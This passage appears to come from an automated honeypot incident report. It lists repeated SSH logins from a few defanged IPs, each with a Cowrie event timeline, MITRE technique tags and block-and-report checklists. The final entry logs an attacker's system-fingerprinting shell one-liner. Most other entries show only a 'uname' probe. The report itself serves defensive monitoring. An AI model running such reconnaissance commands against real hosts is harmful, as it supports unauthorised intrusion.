**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f738387522

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:27` | `cowrie.session.connect` |
| `2026-08-15 05:40:27` | `cowrie.client.version` |
| `2026-08-15 05:40:27` | `cowrie.client.kex` |
| `2026-08-15 05:40:28` | `cowrie.login.success` |
| `2026-08-15 05:40:29` | `cowrie.session.params` |
| `2026-08-15 05:40:29` | `cowrie.command.input` |
| `2026-08-15 05:40:29` | `cowrie.log.closed` |
| `2026-08-15 05:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e322f3b387

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:33` | `cowrie.session.connect` |
| `2026-08-15 05:40:33` | `cowrie.client.version` |
| `2026-08-15 05:40:33` | `cowrie.client.kex` |
| `2026-08-15 05:40:33` | `cowrie.login.success` |
| `2026-08-15 05:40:34` | `cowrie.session.params` |
| `2026-08-15 05:40:34` | `cowrie.command.input` |
| `2026-08-15 05:40:34` | `cowrie.log.closed` |
| `2026-08-15 05:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02364655c0e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:38` | `cowrie.session.connect` |
| `2026-08-15 05:40:38` | `cowrie.client.version` |
| `2026-08-15 05:40:38` | `cowrie.client.kex` |
| `2026-08-15 05:40:38` | `cowrie.login.success` |
| `2026-08-15 05:40:39` | `cowrie.session.params` |
| `2026-08-15 05:40:39` | `cowrie.command.input` |
| `2026-08-15 05:40:39` | `cowrie.log.closed` |
| `2026-08-15 05:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe1511166de8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:43` | `cowrie.session.connect` |
| `2026-08-15 05:40:43` | `cowrie.client.version` |
| `2026-08-15 05:40:43` | `cowrie.client.kex` |
| `2026-08-15 05:40:43` | `cowrie.login.success` |
| `2026-08-15 05:40:44` | `cowrie.session.params` |
| `2026-08-15 05:40:44` | `cowrie.command.input` |
| `2026-08-15 05:40:44` | `cowrie.log.closed` |
| `2026-08-15 05:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27d11360a5ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:48` | `cowrie.session.connect` |
| `2026-08-15 05:40:48` | `cowrie.client.version` |
| `2026-08-15 05:40:48` | `cowrie.client.kex` |
| `2026-08-15 05:40:48` | `cowrie.login.success` |
| `2026-08-15 05:40:49` | `cowrie.session.params` |
| `2026-08-15 05:40:49` | `cowrie.command.input` |
| `2026-08-15 05:40:49` | `cowrie.log.closed` |
| `2026-08-15 05:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ec0bf36ca8b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:52` | `cowrie.session.connect` |
| `2026-08-15 05:40:52` | `cowrie.client.version` |
| `2026-08-15 05:40:52` | `cowrie.client.kex` |
| `2026-08-15 05:40:53` | `cowrie.login.success` |
| `2026-08-15 05:40:54` | `cowrie.session.params` |
| `2026-08-15 05:40:54` | `cowrie.command.input` |
| `2026-08-15 05:40:54` | `cowrie.log.closed` |
| `2026-08-15 05:40:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-390250ef4aa7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:40 |
| **Last Seen** | 2026-08-15 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:40:58` | `cowrie.session.connect` |
| `2026-08-15 05:40:58` | `cowrie.client.version` |
| `2026-08-15 05:40:58` | `cowrie.client.kex` |
| `2026-08-15 05:40:58` | `cowrie.login.success` |
| `2026-08-15 05:40:59` | `cowrie.session.params` |
| `2026-08-15 05:40:59` | `cowrie.command.input` |
| `2026-08-15 05:40:59` | `cowrie.log.closed` |
| `2026-08-15 05:40:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37238363411a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:03` | `cowrie.session.connect` |
| `2026-08-15 05:41:03` | `cowrie.client.version` |
| `2026-08-15 05:41:03` | `cowrie.client.kex` |
| `2026-08-15 05:41:04` | `cowrie.login.success` |
| `2026-08-15 05:41:04` | `cowrie.session.params` |
| `2026-08-15 05:41:04` | `cowrie.command.input` |
| `2026-08-15 05:41:05` | `cowrie.log.closed` |
| `2026-08-15 05:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd55332ce3a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:08` | `cowrie.session.connect` |
| `2026-08-15 05:41:09` | `cowrie.client.version` |
| `2026-08-15 05:41:09` | `cowrie.client.kex` |
| `2026-08-15 05:41:09` | `cowrie.login.success` |
| `2026-08-15 05:41:10` | `cowrie.session.params` |
| `2026-08-15 05:41:10` | `cowrie.command.input` |
| `2026-08-15 05:41:10` | `cowrie.log.closed` |
| `2026-08-15 05:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8034b98544

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:14` | `cowrie.session.connect` |
| `2026-08-15 05:41:14` | `cowrie.client.version` |
| `2026-08-15 05:41:14` | `cowrie.client.kex` |
| `2026-08-15 05:41:15` | `cowrie.login.success` |
| `2026-08-15 05:41:15` | `cowrie.session.params` |
| `2026-08-15 05:41:15` | `cowrie.command.input` |
| `2026-08-15 05:41:16` | `cowrie.log.closed` |
| `2026-08-15 05:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9095e88d37cb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:19` | `cowrie.session.connect` |
| `2026-08-15 05:41:19` | `cowrie.client.version` |
| `2026-08-15 05:41:20` | `cowrie.client.kex` |
| `2026-08-15 05:41:20` | `cowrie.login.success` |
| `2026-08-15 05:41:21` | `cowrie.session.params` |
| `2026-08-15 05:41:21` | `cowrie.command.input` |
| `2026-08-15 05:41:21` | `cowrie.log.closed` |
| `2026-08-15 05:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe40ec435d2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:25` | `cowrie.session.connect` |
| `2026-08-15 05:41:25` | `cowrie.client.version` |
| `2026-08-15 05:41:25` | `cowrie.client.kex` |
| `2026-08-15 05:41:25` | `cowrie.login.success` |
| `2026-08-15 05:41:26` | `cowrie.session.params` |
| `2026-08-15 05:41:26` | `cowrie.command.input` |
| `2026-08-15 05:41:26` | `cowrie.log.closed` |
| `2026-08-15 05:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0e97c4deea5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:30` | `cowrie.session.connect` |
| `2026-08-15 05:41:30` | `cowrie.client.version` |
| `2026-08-15 05:41:30` | `cowrie.client.kex` |
| `2026-08-15 05:41:31` | `cowrie.login.success` |
| `2026-08-15 05:41:32` | `cowrie.session.params` |
| `2026-08-15 05:41:32` | `cowrie.command.input` |
| `2026-08-15 05:41:32` | `cowrie.log.closed` |
| `2026-08-15 05:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a759126ffd7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:35` | `cowrie.session.connect` |
| `2026-08-15 05:41:36` | `cowrie.client.version` |
| `2026-08-15 05:41:36` | `cowrie.client.kex` |
| `2026-08-15 05:41:36` | `cowrie.login.success` |
| `2026-08-15 05:41:37` | `cowrie.session.params` |
| `2026-08-15 05:41:37` | `cowrie.command.input` |
| `2026-08-15 05:41:38` | `cowrie.log.closed` |
| `2026-08-15 05:41:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb767110a162

| Field | Detail |
|---|---|
| **Source IP** | `34.52.159[.]185` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:40` | `cowrie.session.connect` |
| `2026-08-15 05:41:40` | `cowrie.client.version` |
| `2026-08-15 05:41:40` | `cowrie.client.kex` |
| `2026-08-15 05:41:42` | `cowrie.login.success` |
| `2026-08-15 05:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.52.159[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.52.159[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5b3e2f65d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:41` | `cowrie.session.connect` |
| `2026-08-15 05:41:41` | `cowrie.client.version` |
| `2026-08-15 05:41:42` | `cowrie.client.kex` |
| `2026-08-15 05:41:43` | `cowrie.login.success` |
| `2026-08-15 05:41:44` | `cowrie.session.params` |
| `2026-08-15 05:41:44` | `cowrie.command.input` |
| `2026-08-15 05:41:44` | `cowrie.log.closed` |
| `2026-08-15 05:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85c7d9ff8550

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:46` | `cowrie.session.connect` |
| `2026-08-15 05:41:46` | `cowrie.client.version` |
| `2026-08-15 05:41:46` | `cowrie.client.kex` |
| `2026-08-15 05:41:47` | `cowrie.login.success` |
| `2026-08-15 05:41:47` | `cowrie.session.params` |
| `2026-08-15 05:41:47` | `cowrie.command.input` |
| `2026-08-15 05:41:48` | `cowrie.log.closed` |
| `2026-08-15 05:41:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2e291646ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:51` | `cowrie.session.connect` |
| `2026-08-15 05:41:51` | `cowrie.client.version` |
| `2026-08-15 05:41:52` | `cowrie.client.kex` |
| `2026-08-15 05:41:52` | `cowrie.login.success` |
| `2026-08-15 05:41:53` | `cowrie.session.params` |
| `2026-08-15 05:41:53` | `cowrie.command.input` |
| `2026-08-15 05:41:53` | `cowrie.log.closed` |
| `2026-08-15 05:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5312c9575d0e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:41 |
| **Last Seen** | 2026-08-15 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:41:57` | `cowrie.session.connect` |
| `2026-08-15 05:41:57` | `cowrie.client.version` |
| `2026-08-15 05:41:57` | `cowrie.client.kex` |
| `2026-08-15 05:41:57` | `cowrie.login.success` |
| `2026-08-15 05:41:58` | `cowrie.session.params` |
| `2026-08-15 05:41:58` | `cowrie.command.input` |
| `2026-08-15 05:41:58` | `cowrie.log.closed` |
| `2026-08-15 05:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55751385e807

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:02` | `cowrie.session.connect` |
| `2026-08-15 05:42:02` | `cowrie.client.version` |
| `2026-08-15 05:42:02` | `cowrie.client.kex` |
| `2026-08-15 05:42:02` | `cowrie.login.success` |
| `2026-08-15 05:42:03` | `cowrie.session.params` |
| `2026-08-15 05:42:03` | `cowrie.command.input` |
| `2026-08-15 05:42:03` | `cowrie.log.closed` |
| `2026-08-15 05:42:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-951c3665c9f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:07` | `cowrie.session.connect` |
| `2026-08-15 05:42:07` | `cowrie.client.version` |
| `2026-08-15 05:42:07` | `cowrie.client.kex` |
| `2026-08-15 05:42:08` | `cowrie.login.success` |
| `2026-08-15 05:42:09` | `cowrie.session.params` |
| `2026-08-15 05:42:09` | `cowrie.command.input` |
| `2026-08-15 05:42:09` | `cowrie.log.closed` |
| `2026-08-15 05:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10dc65863d88

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:12` | `cowrie.session.connect` |
| `2026-08-15 05:42:12` | `cowrie.client.version` |
| `2026-08-15 05:42:12` | `cowrie.client.kex` |
| `2026-08-15 05:42:13` | `cowrie.login.success` |
| `2026-08-15 05:42:14` | `cowrie.session.params` |
| `2026-08-15 05:42:14` | `cowrie.command.input` |
| `2026-08-15 05:42:14` | `cowrie.log.closed` |
| `2026-08-15 05:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bc75d3680a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:18` | `cowrie.session.connect` |
| `2026-08-15 05:42:18` | `cowrie.client.version` |
| `2026-08-15 05:42:18` | `cowrie.client.kex` |
| `2026-08-15 05:42:18` | `cowrie.login.success` |
| `2026-08-15 05:42:19` | `cowrie.session.params` |
| `2026-08-15 05:42:19` | `cowrie.command.input` |
| `2026-08-15 05:42:19` | `cowrie.log.closed` |
| `2026-08-15 05:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-172ccd9ca3c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:23` | `cowrie.session.connect` |
| `2026-08-15 05:42:23` | `cowrie.client.version` |
| `2026-08-15 05:42:23` | `cowrie.client.kex` |
| `2026-08-15 05:42:24` | `cowrie.login.success` |
| `2026-08-15 05:42:24` | `cowrie.session.params` |
| `2026-08-15 05:42:24` | `cowrie.command.input` |
| `2026-08-15 05:42:25` | `cowrie.log.closed` |
| `2026-08-15 05:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98ed37d44fe8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:28` | `cowrie.session.connect` |
| `2026-08-15 05:42:28` | `cowrie.client.version` |
| `2026-08-15 05:42:28` | `cowrie.client.kex` |
| `2026-08-15 05:42:30` | `cowrie.login.success` |
| `2026-08-15 05:42:31` | `cowrie.session.params` |
| `2026-08-15 05:42:31` | `cowrie.command.input` |
| `2026-08-15 05:42:31` | `cowrie.command.input` |
| `2026-08-15 05:42:31` | `cowrie.command.input` |
| `2026-08-15 05:42:31` | `cowrie.command.input` |
| `2026-08-15 05:42:31` | `cowrie.command.input` |
| `2026-08-15 05:42:31` | `cowrie.command.success` |
| `2026-08-15 05:42:31` | `cowrie.command.input` |
